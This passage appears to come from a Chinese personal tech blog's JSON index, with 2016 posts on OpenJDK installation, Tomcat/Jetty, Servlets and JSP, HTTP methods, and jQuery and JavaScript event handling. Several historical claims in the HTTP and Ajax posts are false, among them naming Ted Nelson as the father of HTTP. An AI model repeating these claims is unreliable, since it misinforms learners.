k事务概要&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Install 12 Package(s)总下载量：93 MInstalled size: 408 M确定吗？[y&#x2F;N]：y 输入y进行安装，看到以下信息表示安装结束 12345678910111213141516171819已安装: java-1.7.0-openjdk.x86_64 1:1.7.0.101-2.6.6.4.el6_8 java-1.7.0-openjdk-demo.x86_64 1:1.7.0.101-2.6.6.4.el6_8 java-1.7.0-openjdk-devel.x86_64 1:1.7.0.101-2.6.6.4.el6_8 java-1.7.0-openjdk-javadoc.noarch 1:1.7.0.101-2.6.6.4.el6_8 java-1.7.0-openjdk-src.x86_64 1:1.7.0.101-2.6.6.4.el6_8 作为依赖被安装: giflib.x86_64 0:4.1.6-3.1.el6 jpackage-utils.noarch 0:1.7.5-3.16.el6 lksctp-tools.x86_64 0:1.0.10-7.el6 pcsc-lite-libs.x86_64 0:1.5.2-15.el6 ttmkfdir.x86_64 0:3.0.9-32.1.el6 tzdata-java.noarch 0:2016f-1.el6 xorg-x11-fonts-Type1.noarch 0:7.2-11.el6 完毕！ 然后进行Java环境测试得到Java版本信息 12[root@localhost yum.repos.d]# java -version","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"},{"name":"Servlet","slug":"Servlet","permalink":"http://yoursite.com/tags/Servlet/"},{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"DataBase","slug":"DataBase","permalink":"http://yoursite.com/tags/DataBase/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"},{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"Tutorial","slug":"Tutorial","permalink":"http://yoursite.com/tags/Tutorial/"}]},{"title":"Jetty的work目录在哪里","date":"2016-07-17T12:30:00.000Z","path":"2016/07/17/Jetty的work目录在哪里/","text":"Jetty的work目录在哪里在文章Hello Web(一):Apache/Niginx/Tomcat/Jetty服务器容器里讲到了Tomcat会有一个 work 目录来进行Servlet的Java文件的生成，按说Jetty也是Servlet容器啊，他的work在哪里呢？。。。 后来经过网上百度，说你手动建立一个 work 文件夹就能看到Java化的JSP文件了。。。。（;￣O￣）一口老血","tags":[{"name":"Servlet","slug":"Servlet","permalink":"http://yoursite.com/tags/Servlet/"},{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"}]},{"title":"WebServlet的工作原理","date":"2016-07-17T12:00:00.000Z","path":"2016/07/17/WebServlet的工作原理/","text":"WebServlet的工作原理在文章HTTP和Servlet的关系与Hello Web(二):静态网页与动态网页的文章中，我们提到了不管是动态网页还是Java后台接口，其基础都是Servlet Servlet的TargetIDE生成的Servlet的Target是一个以war为结尾的文件， 其本质是一个压缩包，可以被URL通过路径方式访问内部内容 war包被访问普通文件war包中的大部分文件，可以直接被HTTP请求访问文件内容, 只需要在URL中加上同名路径 动态网页文件而JSP等动态网页文件在被访问时，会由 基于Java的Servlet服务器容器 (如Tomcat Jetty) 在work目录下生成一个同目录的java和class文件，并且根据web.xml配置执行Servlet的HTTP操作。","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Servlet","slug":"Servlet","permalink":"http://yoursite.com/tags/Servlet/"},{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"}]},{"title":"Hello Web(三):接口与后台逻辑","date":"2016-07-17T11:22:00.000Z","path":"2016/07/17/HelloWeb接口与后台逻辑/","text":"接口的定义狭义的接口被认为是仅仅为了传送数据而存在的URL地址(是被我认为的，也没百度)，目前来看，常用的数据结构定义有两种 XML JSON 通过发送HTTP的Request请求，可以得到数据性质的Response返回报文，这些数据代表着后台的逻辑行为 接口的基础和责任接口的基础是HTTP协议，其责任是反应后台逻辑，所以说需要一种与后台语言相同的HTTP的实现，而Servlet是最著名的Java EE后台的HTTP实现所以说： Servlet是由Java代码编写的，而Java EE又可以进行后台逻辑处理，那么基于Servlet的接口就反应了Java代码书写的后台的逻辑 是不是接口全是Servlet并不是，接口和Servlet没有直接关系，Servlet只是Java代码的HTTP逻辑实现，在其它语言中如 Node.js PHP Swift3.0 都有自己的HTTP逻辑实现，只要能完成HTTP操作，并且可以书写后台逻辑，都可以生成接口。 接口中HTTP常见的知识点误区在前端工程师的面试过程中，经常会问到的一个问题： Get请求和POST请求有什么区别 不管是百度还是Google 第一个答案都是： Get请求参数在URL中，长度有限制 Post请求参数在Body中，长度没限制，而且更加安全 这个答案是错的 Get和Post有什么区别呢首先来讲 Get和Post和接口安全不安全没有一毛钱关系 其次才是以下两点 Get请求并不是必须把参数放在URL里，长度有限制倒是真的 Post也可以把参数放在URL里 Get和Post只是HTTP的六个方法中的两个，和请求参数的存放也没有任何关系 HTTP的知识请参照HTTP报文基本概念学习 为什么会产生这个问题(八卦，可以不看)根据我个人理解，HTTP之父美国人Ted Nelson构思HTTP的时候，当时的超文本只有HTML一种，并没有XML和JSON，当时他已经意识到以后必须出现一种方案来解决 动态的数据 的传送问题，于是就预先设定了8个方法来完成不同功能 HTTP方法 HTTP作用 Get 获取数据,从服务器获取 Post 传送数据,不保存 Put 提交数据,保存在服务器 DELETE 删除数据,从服务器 HEAD 仅仅获得报文头 OPTIONS 可选方法,用于增加扩展性 CONNECT 仅仅建立一次HTTP链接，不传送数据 TRACE 调试链接,追踪数据 从实际的应用看来 好多方法明显是为了以后的动态数据处理奠定基础，结果业界发展向了另外一个方向 所以在目前的业务中，其余的方法都被闲置了，而且这些方法都没有规定参数必须放在哪里，参数和方法在HTTP中是完全独立的两个概念。 GoodBye Web经过了三篇文章的BB，我们来进行Hello Web的总结来梳理如何建立从 网页视图 至 服务器后台 之间的联系 静态网页＋Ajax－－－－－－静态网页－－－－－－ 浏览器针对URL发送HTTP的Get请求 服务器响应HTTP请求，把page.html文件内容放入Response报文 浏览器接收到Response报文，展示成网页（至此静态网页结束） －－－－－－Ajax请求接口－－－－－－ 浏览器发送Ajax的HTTP请求，携带请求参数 服务器接收到HTTP请求 利用某种后台语言的HTTP实现执行某种逻辑（如Servlet执行Java本地代码从数据库读数据） 把结构化的数据放入HTTP的Response报文 浏览器根据Ajax的返回报文对HTML文本进行更改更新页面 动态网页 浏览器发送HTTP的Get请求 服务器后台接收到HTTP请求 利用某种后台语言的HTTP语言实现生成一段HTML文本（如基于Servlet的JSP） 把生成的HTML文本放入HTTP的Response报文 浏览器接收到Response报文，展示成网页 建立接口的必备条件根据以上总结，能够通过接口建立联系的必备条件是以下几点 某种语言能完成复杂的逻辑执行建立服务器（如Java） 语言能够进行传输协议收发的实现（如基于Java的Servlet完成了HTTP） 有一个针对该实现的服务器容器（如Tomcat） 语言可以链接和操作数据库（如Java中的JDBC） 凡是满足了以上四点的，都可以当作一个服务器建立起来，并且和前端进行交互，如现在的Node.js和PHP等等，至于后台逻辑怎么运行以及和数据库进行交互，会有其它文章另行总结。","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"},{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"Ajax","slug":"Ajax","permalink":"http://yoursite.com/tags/Ajax/"}]},{"title":"Hello Web(二):静态网页与动态网页","date":"2016-07-17T01:22:00.000Z","path":"2016/07/17/HelloWeb静态网页与动态网页/","text":"网页是如何产生的根据文章Hello Web(一)中所描述的情况，网页本身是一个HTML文件，经由浏览器发送HTTP的Request请求，从服务器返回的Response中浏览了HTML文件的内容。 从以上过程中可以看出，浏览器展示什么样的网页完全取决于HTTP的Response报文内容，而不是取决于HTML文件中真是存在的内容。如果在传输过程中产生了意外造成了部分报文丢失，那么展示出的完全是另外一个样子的页面。 HTTP请求和网页的独立发展视图与数据HTTP请求并不是天生为网页而存在的，HTTP在设立的时候并没有要求其报文必须是HTML文本(虽然当时超文本只有HTML一种)，HTTP缩写的前两个字母Hyper Text是指的任何承载了 符号 本身含义以外的文本，HTML只是Hyper Text的一种，另外的比如XML。 由于HTTP本身并不是单纯为传送网页而存在的，所以也有人使用XML文本来单纯的传送结构化数据(后来又出现了JSON) 静态与动态 静态的视图： 一旦HTML文本书写的文件完成，在浏览的过程中，其本身不会发生任何变化，属于静态。 动态的数据： 结构化数据中，虽然确定了数据名(Key-Value)中的Key，其Value是可能随时发生变化的 其中动态的数据是由服务器中一系列逻辑代码生成，这些将会在下一章节Hello Web(三):接口与后台中进行详细分析。 动态网页的产生在基于 静态的视图 和 动态的数据 的基础上，有人考虑说，我可以不可以 根据逻辑不同生成不同的网页，而不是单一不变的，把页面中加入动态的数据的特性 。 JSP在2006年，JSP 2.1的规范作为Java EE 5的一部分被Sun公司发布，其作为Java Servlet 2.1 的一个扩展用来处理动态网页，Servlet是什么参考这里，其本身以HTML文件为基础，新定义了一种JSP格式，加入了新的标签以及Java代码段，简单的来讲 JSP ＝ HTML ＋ JAVA 而Servlet是Java语言里HTTP的一种实现，来链接 服务器本地逻辑 转化成 网络请求 的工具，所以此时就相当于在HTML的文本里加入了动态的数据特性。 JSP文件可以被浏览么在上一章中所讲述的，page.html被保存在服务器端口，可以通过服务器进行浏览，那么JSP文件被保存在服务器端，我们浏览的时候为什么看不到JAVA代码呢？ 在任何一个JSP的讲解中都会讨论的一个问题是，先有Servlet还是先有JSP，答案是 先有Servlet ，在Tomcat容器中，一旦你放入了包含JSP的War包，在访问时会在 work 目录中生成带有 _jsp 后缀的Java和Class文件，该文件就是一个Servlet。 访问URL 对应服务器文件夹 对应Servlet文件 http://127.0.0.1:8080/dynamic/page Tomcat/webapps/ROOT/dynamic.war/page.jsp Tomcat/work/ROOT/dynamic/…/page_jsp.java 由于Servlet是对HTTP对实现，所以说此时并不存在一个可以被浏览的HTML文件，而是一个基于后台逻辑的Servlet，浏览这个对应JSP的后果是 返回了一个恰好包含了HTML文本的HTTP报文 基于上一章的结论，你在浏览器前看到了一个网页。 动态网页和静态网页的实质区别(结论)巴拉巴拉讲了一大堆，此处可以得到结论 静态网页是一个实际存在的HTML文件，而动态网页是一种通过HTTP传输的后台逻辑，只是Response报文恰好是HTML文本 所以说动态网页是作为了一种桥梁，把后台的逻辑变化实时的反映到了前台浏览的视图上，值得注意的是JSP仅仅是动态网页技术的一种，还有很多其它技术，但是原理相似。 动态网页的弊端与Ajax与动态网页研究同步进行的还有另外一个技术Ajax(Asynchronous JavaScript and XML)，其采用了完全不同的方式在静态的HTML文本中加入 动态的数据 ，而且解决了动态网页的两个弊端 一个网页中，数据占据视图很少的一部分，动态网页每次都是生成完整的视图，大部分不变的静态信息第二次传递是多余的 动态网页每次被访问都要在后台执行相同的逻辑，耗时较多 AjaxAjax技术于2005年发布，甚至早于JSP的公开版本，其采用多次发送请求的方式 第一次请求浏览静态网页 第二次请求获得动态的数据 使用JavaScript脚本语言在浏览器端操作HTML展示动态的数据 由于静态网页不需要执行后台逻辑，可以响应速度相对较快，可以在先展现了页面的情况下减少用户的等待时间，然后通过XML(或JSON)文本传送格式化的数据。 Ajax与动态网页的区别 技术名称 发送HTTP请求次数 视图与数据获取步骤 视图与数据是否分离 动态网页 单次请求 一次性获取视图和数据 没有分离 Ajax 多次请求 首先获得视图再分批获得数据 产生分离 Ajax的弊端Ajax虽然把单次响应时间分散成了多次，给人感觉似乎更加优秀，但是其也有很多弊端 多次请求不可控，每次请求都有失败的可能性造成部分数据丢失 改变前端视图的过程中需要准确的操作 Ajax需要接口化，同一个页面需要分为页面和接口 Ajax的前提：接口在静态网页中，每次发送HTTP请求得到的是一个包含了HTML文本的返回报文，从而得到是一个网页，如果为了获取到数据而发送的HTTP报文，得到纯粹是格式化的的数据，我们称呼这种URL为 接口 下一章 Hello Web(三):接口与后台 将进行讲解 结束语在实际的网页使用中，并没有严格的动态网页和静态网页的区分，会经常结合使用，从展示效果上来看 基本上目前主流认知是 动态网页 ＝ 静态网页＋Ajax","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"},{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"Ajax","slug":"Ajax","permalink":"http://yoursite.com/tags/Ajax/"}]},{"title":"Hello Web(一):Apache/Niginx/Tomcat/Jetty服务器容器","date":"2016-07-14T12:48:00.000Z","path":"2016/07/14/HelloWebApacheNiginxTomcatJetty服务器容器/","text":"Hello Web(纯文字没图这个系列我写着都好烦)这个系列的笔记会把自己理解的网页到服务端一些总结，整个过程从页面到服务器文件停止，并不涉及过多后台逻辑内容 因为个人水平有限，有可能理解有偏差，如果坑了各位，-_-# 你又不能打我 阅读这个系列前需要先搞懂以下知识点 HTML基础知识 什么是容器 HTTP协议 Servlet是什么 服务器容器接触到网络的人都知道服务器的概念，从硬件上来讲服务器就是一个24小时运行的电脑，和家里的PC没什么本质上的区别，而从软件概念上来讲是指的服务器容器，而我们最常见的服务器容器有4个 服务器容器 开发组织 服务器归类 Apache Apache 静态服务器 Niginx 一个叫Igor Sysoev毛子写的（这个屌这个屌) 静态服务器 Tomcat Apache 动态服务器 Jetty Eclipse（没错，就是那个IDE的公司） 动态服务器 其中最令人迷惑的是 静态服务器 和 动态服务器 的概念，该概念会在静态网页与动态网页中详细讲解，其主要区别就是： 静态服务器只是用来存放文件，动态服务器可以完成Servlet等逻辑功能 服务器容器如何工作网页是什么了解过HTML基础知识之后，可以知道网页实质就是一个HTML文件，是一堆由各种DOM组成的文本，使用具有解析功能的浏览器软件，即时是放在本地，也可以对这些文本进行解析展示给用户，我们只需要找到这个文件的存放地址，然后用浏览器打开就可以了。 如何找到HTML文件与磁盘里存在C盘某某某文件夹不同，这个文件存放在服务器电脑的硬盘里，我们就需要用HTTP协议把他读出来 1http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;page.html 以上就是一个完整的HTTP请求，请求的文件是page这个html文件，根据HTTP讲解文章里提到的HTTP本质还是电报和电话，既然你想要随时访问服务器，那么服务器就需要有个人24小时不睡觉等着回复你HTTP返回报文，这个人就是服务器容器，我们以Tomcat举例 去下载一个服务器Apache官网可以下载到不同的服务器版本，下载符合自己系统的Core，比如我下载的就是zip的在Mac上解压开得到一个大概15M的文件夹，这个就是一个完整的服务器容器 文件/文件夹 用途 bin binary文件夹，主要是执行启动/关闭的脚本 conf configure文件夹，主要包括了服务器容器配置文件server.xml和webapp的默认配置文件web.xml lib 库文件目录，由于Tomcat是基于Java的，这里存放了Tomcat使用的jar文件 LICENSE 许可文件，(つД`)ノ土鳖的我看不懂的文件1 logs 默认日志文件目录 NOTICE 通知文件，(つД`)ノ有点像TokyoHot开头那个WARNING RELEASE-NOTES 发布笔记，(つД`)ノ土鳖的我看不懂的文件2 RUNNING 跑？什么鬼，(つД`)ノ土鳖的我看不懂的文件3 temp 临时文件存放处 webapps web应用目录(十分重要) work 工作区，主要是和servlet相关 可以看出来Apache的命名是很有讲究的，其中文件采用全大写命名，而文件夹使用全小写命名 启动服务器容器如果想启动Tomcat只需要在终端进入bin文件执行starup脚本就可以了，这个程序就会24小时不停的监听8080端口有没有HTTP的Request请求，这里有两个注意点 你需要有执行startup.sh的权限(错误会提示Permission Deny) 你需要执行正确位置的startup.sh脚本(错误会提示 command not found) 1234cd ...&#x2F;Tomcat&#x2F;binsudo chmod 755 .&#x2F;startup.shsudo .&#x2F;startup.sh 注意执行脚本时要指定绝对目录，不要cd到bin之后 sudo startup.sh 这是执行Mac系统bin文件下的startup脚本，系统中不存在，当然会存在问题2，详细原因需要学习Unix系统 Page.html文件在哪在刚刚提到了所谓网页就是存放在服务器的一个page.html文件，可以通过HTTP请求访问到，那么这个文件在哪呢？是放在了服务器的C盘么？ webapps文件在默认配置下，所有的当你使用ip＋端口号访问服务器时，会访问到Tomcat服务器的webapps/ROOT文件夹，所以具有以下映射关系 访问URL 对应服务器文件夹 http://127.0.0.1:8080/ Tomcat/webapps/ROOT http://127.0.0.1:8080/page.html Tomcat/webapps/ROOT/page.html 根目录的配置由此我们可以知道，通过浏览器是如何访问服务端的文件的了，但是你说我不想放在ROOT下能不能访问到呢？ 答案是可以的，可以通过修改服务器容器配置server.xml来配置服务器(硬件)计算机上的任何一个目录当作容器的根目录 访问Page文件的过程在知道如何访问服务器文件之后，那我可以不可以和放在C盘的文件一样，到服务器的目录里把文件剪切过来呢？ 答案是 不可以 HTTP协议访问与访问本机文件不同，访问服务器是通过HTTP协议进行的，你访问的并不是真实的这个文件，只是HTTP返回报文的报文体正好是这个文件的内容 访问过程 浏览器浏览 127.0.0.1:8080/page.html，发送了一个HTTP的Request报文 Tomcat在服务器监听到Request的请求，去ROOT目录寻找page.html文件 page.html不存在，展示404页面，page.html文件存在，读取page.html的所有文本（Ctrl-C) 在HTTP请求的Response的报文体中写入page.html文本(Ctrl-V) 浏览器接收到HTTP的Response报文，把报文体显示在页面中 从以上过程可以看出，和访问本地文件不同，你并不是真正 打开 了page.html这个文件，而是 浏览 了page的内容，你能读取到什么内容完全取决HTTP请求的Response报文体 一个网页的诞生综上所述，我们通过一台电脑，一个Tomcat容器，经由HTTP协议，建立了一个服务器，任何一个人只要知道地址就可以来 浏览 服务器上的文件。这就是一个网页的诞生的过程。 接下来Hello Web(二)将要讲述另外一个概念 静态网页与动态网页","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"},{"name":"JSP","slug":"JSP","permalink":"http://yoursite.com/tags/JSP/"},{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"}]},{"title":"JQuery中Ajax的when方法多个返回data的问题","date":"2016-07-13T13:08:00.000Z","path":"2016/07/13/JQuery中Ajax的when方法多个返回data的问题/","text":"JQuery中Ajax的when方法在文章Ajax的共用回调中我提到了一个when…done…方法，有时间去JQuery里看了一下这个方法，突然想到一个问题，每个Ajax都会返回一个data，那么我when里多个请求，怎么获得不同的data呢 获得不同Ajax的Data根据when的使用方法,在when中传入了几个ajax就可以在回调函数中写几个参数，每个参数对应一个返回的Response 但是注意，这里的是只返回的response并不是data,而是一个包含了data的Array 123456789var ajax1 &#x3D; $.ajax(&quot;url1&quot;)var ajax2 &#x3D; $.ajax(&quot;url2&quot;)var ajax3 &#x3D; $.ajax(&quot;url3&quot;)when(ajax1,ajax2,ajax3).done(function(response1,response2,response3)&#123; &#125;) response和data的不同在常规的ajax请求中，回调函数直接活的参数是data，而这里的response是一个Array 123456var response ＝ ｛ &quot;0&quot;:Object, &quot;1&quot;:200, &quot;2&quot;:Object｝ 所以说 response[0] 才是$.post或者$.get回调函数中的参数data","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"},{"name":"JQuery","slug":"JQuery","permalink":"http://yoursite.com/tags/JQuery/"}]},{"title":"JQuery中attr与prop的区别","date":"2016-07-13T12:21:00.000Z","path":"2016/07/13/JQuery中attr与prop的区别/","text":"JQuery中attr与prop的区别先上结论： 在DOM标签里具有 true 和 false 值的属性使用prop()，如 checked, selected 或者 disabled 等，其他的使用 attr() 发现两者不同的契机有一次在使用checkbox的时候，使用attr的情况下，如果设置了checked，不管页面上如何操作获得到checkbox的状态总是被check的，要么就是获取不到，才发现了prop这个东西 产生不同结果的原因根据博客文章介绍 attr() 里面，最关键的两行代码 12345elem.setAttribute( name, value + &quot;&quot; );ret &#x3D; elem.getAttribute( name ); prop() 里面，最关键的两行代码 12345return ( elem[ name ] &#x3D; value );return elem[ name ]; 很明显的看出来，attr使用的是 DOM 的 API setAttribute() 和 getAttribute() 方法操作的属性元素节点。（这个是HTML的概念） 而prop实用的是JS中的Object对象，可以理解为 document.getElementById(el)[name] = value，这使得DOM的属性转化成了 element 的一个成员变量。（这个是JS的概念）","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"JQuery","slug":"JQuery","permalink":"http://yoursite.com/tags/JQuery/"}]},{"title":"JS中动态获取成员变量的值和反射","date":"2016-07-13T12:21:00.000Z","path":"2016/07/13/JS中动态获取成员变量的值和反射/","text":"动态获取成员变量写代码的的时候遇到了一个需求 ajax的请求结果存在两个类Level和Status Level的中是levelId，而Status中是statusId 想用一个函数根据Id来添加一些DOM，但是不确定进来的是Level还是Status 代码如下 12345678910111213141516171819202122232425262728function updateInfo(levelRes,platRes)&#123; &#x2F;&#x2F;Ajax回调取出所有的data var levels &#x3D; levelRes[0].data var status &#x3D; statusRes[0].data &#x2F;&#x2F;获得需要操作的DOM var level &#x3D; $(&quot;select#level&quot;); var status &#x3D; $(&quot;select#status&quot;); &#x2F;&#x2F;用同一个函数进行操作 addOptions(level,levels,&quot;levelId&quot;,&quot;levelName&quot;) addOptions(status,status,&quot;statusId&quot;,&quot;statusName&quot;)&#125;function addOptions($dom,options,id,name) &#123; for (var index in options) &#123; $dom.append( &#39;&lt;option value&#x3D;&quot;&#39; +options[index].???&#x2F;&#x2F;这里按习惯是打.levelId调用，可是进来的是Status怎么办 +&#39;&quot;&gt;&#39; +options[index][name]&#x2F;&#x2F;使用[key]中间加一个动态打变量即可取到不同的值 +&#39;&lt;&#x2F;option&gt;&#39; ) &#125;&#125;$.when(allLevel,allStatus).done(updateInfo) 可以通过[key]动态获取成员变量的原因结合文章[JS中的for…in…][link01]和[JS中的传值和传址][link02]可以知道，JS中所有的Object都是Key-Value形式的，即时是Array也不例外 所以在Java等语言中常使用[]从List数组中取值不同，[]在JS中本质是从某个Key取值，相当于Java中的 map.get(Key) 其实类似的用法在OC中也存在，OC中的NSDictionary是可以通过[Key]取值的 123NSDictionary *dict &#x3D; [NSDictionary dictionaryWithObjectsAndKeys:@&quot;first&quot;,@&quot;1&quot;,@&quot;second&quot;,@&quot;2&quot;, nil];NSLog(@&quot;%@&quot;,dict[@&quot;1&quot;]); JS中存在不存在反射在Java和OC中都存在一个很重要的概念叫做反射，是动态机制的必需品，那么JS有没有这个概念呢？ 反射的实质其实就是在于拿到成员变量或者函数的字符串名，又是由于S中所有的Object都是Key-Value形式的，所以说Object的Key是很容易拿到的，所以就不存在反射这个概念了","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"}]},{"title":"执行某个JS函数传入该DOM本身","date":"2016-07-01T15:00:05.000Z","path":"2016/07/02/执行某个JS函数传入该DOM本身/","text":"HTML中的this在执行某些函数的时候，JS可以接收到你操作的DOM本身，例如table中常用到的tr的onclick, 此时的this就是指的当前的DOM对象 123456&lt;table&gt; &lt;tr class&#x3D;&quot;gradeX odd&quot; onclick&#x3D;&quot;util.selectRow(this)&quot;&gt; &lt;td class&#x3D;&quot;center&quot;&gt;id&lt;&#x2F;td&gt; &lt;td class&#x3D;&quot;center&quot;&gt;name&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"}]},{"title":"在DOM的attribute中直接写JS","date":"2016-07-01T15:00:00.000Z","path":"2016/07/02/在DOM的attribute中直接写JS/","text":"Button中常用的onclick有些时候某些DOM会执行一些简单的JS函数，并不需要一个script标签中定义函数然后执行，开始使用 1&lt;button onclick&#x3D;&quot;alert(&quot;message&quot;)&quot;&gt;Test&lt;&#x2F;button&gt; 并不会执行，查了一下，这里要使用单引号才行，不知道为什么，可能和HTML解析方式有关 1&lt;button onclick&#x3D;&#39;alert(&quot;message&quot;)&#39;&gt;Test&lt;&#x2F;button&gt;","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"}]},{"title":"多个具有点击事件的DOM嵌套","date":"2016-06-30T15:00:10.000Z","path":"2016/07/01/多个具有点击事件的DOM嵌套/","text":"tr中签到链接由于tr具有点击时间，而超链接也可以被点击，所以就造成用户一次操作执行了两个时间，这是一个典型的事件嵌套问题，解决方法是 由于事件是通过冒泡顺序传递的 只需要在合适的地方阻止冒泡，就可以控制执行的步骤 一个例子写三个具有click事件的div进行嵌套 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;libs.baidu.com&#x2F;jquery&#x2F;1.9.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x2F;head&gt;&lt;body&gt; &lt;div id&#x3D;&quot;divOne&quot; onclick&#x3D;&quot;alert(&#39;我是最外层&#39;);&quot;&gt; &lt;div id&#x3D;&quot;divTwo&quot; onclick&#x3D;&quot;alert(&#39;我是中间层！&#39;)&quot;&gt; &lt;a id&#x3D;&quot;hr_three&quot; href&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot; mce_href&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot; onclick&#x3D;&quot;alert(&#39;我是最里层！&#39;)&quot;&gt;点击我&lt;&#x2F;a&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 通过阻止冒泡停止事件传播停止冒泡的函数为 stopPropagation(),需要通过回调函数传入事件event 事件处理过程中，阻止了事件冒泡，但不会阻击默认行为（它就执行了超链接的跳转） 12345678910&lt;body&gt; ... &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; $(function()&#123; $(&quot;#hr_three&quot;).click(function(event)&#123; event.stopPropagation(); &#125;); &#125;); &lt;&#x2F;script&gt;&lt;&#x2F;body&gt; 通过return false停止事件传播事件处理过程中，阻止了事件冒泡，也阻止了默认行为（比如刚才它就没有执行超链接的跳转） 12345678910&lt;body&gt; ... &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; $(function()&#123; $(&quot;#hr_three&quot;).click(function(event)&#123; return false; &#125;); &#125;); &lt;&#x2F;script&gt;&lt;&#x2F;body&gt; 可以不可以不阻止事件冒泡但是阻止默认行为呢事件的回调函数中有一个 1event.preventDefault(); 如果把它放在头部A标签的click事件中，点击“点击我”。 会发现它依次弹出：我是最里层—-&gt;我是中间层—-&gt;我是最外层 但最后却没有跳转到百度 它的作用是：事件处理过程中，不阻击事件冒泡，但阻击默认行为（它只执行所有弹框，却没有执行超链接跳转）","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"}]},{"title":"JS设置一个时间触发器","date":"2016-06-30T15:00:07.000Z","path":"2016/07/01/JS设置一个时间触发器/","text":"时间触发器JS的时间触发器是HTML文本中Windows DOM对象的两个方法，详细链接见JS计时事件 12345var call &#x3D; function() &#123; &#x2F;&#x2F;do something&#125;var timer &#x3D; window.setInterval(call,60000); 如果执行到某个时候想要停止，可以使用 window.clearInterval(timer)进行停止","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"}]},{"title":"多个Ajax共用一个回调函数或并发","date":"2016-06-30T15:00:05.000Z","path":"2016/07/01/多个Ajax共用一个回调函数或并发/","text":"多个Ajax共用一个回调函数开始的时候猜到的大坑在写网页时，有时多个请求可以共用一个回调函数来完成功能，进行了多次研究，整理了一些经验 1234567891011121314var statusUtil &#x3D; &#123; response:function(response) &#123; alert(response.message) &#125;, sign:function() &#123; $.post(url,&#123;&quot;id&quot;:10&#125;,this.response(response),&quot;json&quot;) &#125;, revoke:function() &#123; var handler &#x3D; $.post(url,&#123;&quot;id&quot;:10&#125;) handler.done(this.response(response)) &#125;&#125; 最开始的时候使用以上的代码，会报错 TypeError: response is not a function. (In ‘response(response)’, ‘response’ is undefined) 的错误，根据我的文章JS的回调函数中分析的原因 在JS代码中()代表的意思是作为函数执行 一个取巧的解决方案在没有意识到这一点的时候，我总觉得传递回调函数的时候应该带着参数，所以会写**this.response(response)**来传入参数，后来发现报错，就使用返回一个函数的方法折衷获得结果 12345678var statusUtil &#x3D; &#123; response:function() &#123; return function(reponse) &#123; alert(response.message) &#125; &#125;, ....&#125; 此时就可以通过**this.response()**获取到回调函数 